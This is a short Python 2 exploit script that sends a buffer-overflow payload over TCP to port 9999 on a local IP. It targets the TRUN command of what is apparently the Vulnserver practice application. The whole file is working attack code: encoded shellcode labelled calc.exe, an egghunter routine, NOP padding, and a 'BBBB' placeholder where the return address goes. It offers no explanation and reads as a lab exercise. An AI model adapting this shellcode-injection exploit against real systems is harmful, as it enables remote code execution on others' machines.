#!/usr/bin/python

import os
import sys
import socket

# JMP ESP: 62501203 (Only contains ascii characters.)

# calc.exe
shellcode = ("W00TW00T"
"\xdb\xdc\xb8\xe1\x47\x2c\x17\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x31\x31\x45\x18\x83\xed\xfc\x03\x45\xf5\xa5\xd9\xeb\x1d\xab"
"\x22\x14\xdd\xcc\xab\xf1\xec\xcc\xc8\x72\x5e\xfd\x9b\xd7\x52"
"\x76\xc9\xc3\xe1\xfa\xc6\xe4\x42\xb0\x30\xca\x53\xe9\x01\x4d"
"\xd7\xf0\x55\xad\xe6\x3a\xa8\xac\x2f\x26\x41\xfc\xf8\x2c\xf4"
"\x11\x8d\x79\xc5\x9a\xdd\x6c\x4d\x7e\x95\x8f\x7c\xd1\xae\xc9"
"\x5e\xd3\x63\x62\xd7\xcb\x60\x4f\xa1\x60\x52\x3b\x30\xa1\xab"
"\xc4\x9f\x8c\x04\x37\xe1\xc9\xa2\xa8\x94\x23\xd1\x55\xaf\xf7"
"\xa8\x81\x3a\xec\x0a\x41\x9c\xc8\xab\x86\x7b\x9a\xa7\x63\x0f"
"\xc4\xab\x72\xdc\x7e\xd7\xff\xe3\x50\x5e\xbb\xc7\x74\x3b\x1f"
"\x69\x2c\xe1\xce\x96\x2e\x4a\xae\x32\x24\x66\xbb\x4e\x67\xec"
"\x3a\xdc\x1d\x42\x3c\xde\x1d\xf2\x55\xef\x96\x9d\x22\xf0\x7c"
"\xda\xdd\xba\xdd\x4a\x76\x63\xb4\xcf\x1b\x94\x62\x13\x22\x17"
"\x87\xeb\xd1\x07\xe2\xee\x9e\x8f\x1e\x82\x8f\x65\x21\x31\xaf"
"\xaf\x42\xd4\x23\x33\xab\x73\xc4\xd6\xb3")

nops = '\x90' * 8

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"
"\x74\xef\xb8\x57\x30\x30\x54\x89\xd7\xaf\x75\xea\xaf\x75\xe7"
"\xff\xe7")

payload = nops
#payload += "\x89\xc4\x66\x81\xec\x04\x01"
payload += egghunter
payload += 'A' * (2002 - len(payload))
payload += 'BBBB'
payload += 'C' * (3000 - len(payload))

# Send the 1st stage payload to the LTER command
connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect.connect(('192.168.1.36',9999))
print connect.recv(1024)
connect.send('TRUN  /../' + payload + '\r\n')
connect.recv(1024)
connect.close()